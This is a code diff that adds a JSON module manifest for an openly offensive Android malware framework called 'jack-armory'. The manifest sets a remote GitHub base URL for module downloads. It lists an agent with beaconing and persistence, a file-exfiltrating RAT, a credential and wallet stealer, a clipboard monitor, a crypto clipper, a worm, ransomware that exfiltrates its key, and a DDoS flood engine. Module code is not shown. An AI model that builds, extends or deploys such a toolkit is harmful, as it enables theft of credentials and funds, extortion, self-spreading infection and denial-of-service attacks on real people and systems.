@@ -1,0 +1,78 @@
+{
+  "version": "1.0.0",
+  "base_url": "https://raw.githubusercontent.com/JackPyDev/jack-armory/main",
+  "modules": [
+    {
+      "id": "agent",
+      "path": "modules/agent.py",
+      "name": "Agent Core",
+      "category": "core",
+      "description": "Registration, beacon loop, command dispatch, module install, persistence.",
+      "platform": "android-pydroid",
+      "requires": ["none"]
+    },
+    {
+      "id": "rat",
+      "path": "modules/rat.py",
+      "name": "RAT Sweeper",
+      "category": "remote",
+      "description": "Continuous filesystem sweep with base64 exfil to Firestore.",
+      "platform": "android-pydroid",
+      "requires": ["none"]
+    },
+    {
+      "id": "stealer",
+      "path": "modules/stealer.py",
+      "name": "Credential Stealer",
+      "category": "steal",
+      "description": "Browser logins, cookies, Discord tokens, crypto wallet files.",
+      "platform": "android-pydroid",
+      "requires": ["none"]
+    },
+    {
+      "id": "keylogger",
+      "path": "modules/keylogger.py",
+      "name": "Clipboard Monitor",
+      "category": "steal",
+      "description": "Polls Termux clipboard, pushes changes to Firestore.",
+      "platform": "android-pydroid",
+      "requires": ["termux"]
+    },
+    {
+      "id": "clipper",
+      "path": "modules/clipper.py",
+      "name": "Crypto Clipper",
+      "category": "steal",
+      "description": "Swaps clipboard crypto addresses with operator wallets.",
+      "platform": "android-pydroid",
+      "requires": ["termux"]
+    },
+    {
+      "id": "worm",
+      "path": "modules/worm.py",
+      "name": "Worm Replicator",
+      "category": "spread",
+      "description": "Copies self into shared storage directories and one level deep.",
+      "platform": "android-pydroid",
+      "requires": ["none"]
+    },
+    {
+      "id": "ransomware",
+      "path": "modules/ransomware.py",
+      "name": "Ransomware Locker",
+      "category": "destruct",
+      "description": "XOR-encrypts target dirs, drops ransom note, exfils key.",
+      "platform": "android-pydroid",
+      "requires": ["none"]
+    },
+    {
+      "id": "ddos",
+      "path": "modules/ddos.py",
+      "name": "Flood Engine",
+      "category": "attack",
+      "description": "Multi-threaded UDP/TCP/HTTP flood against configured target.",
+      "platform": "android-pydroid",
+      "requires": ["none"]
+    }
+  ]
+}
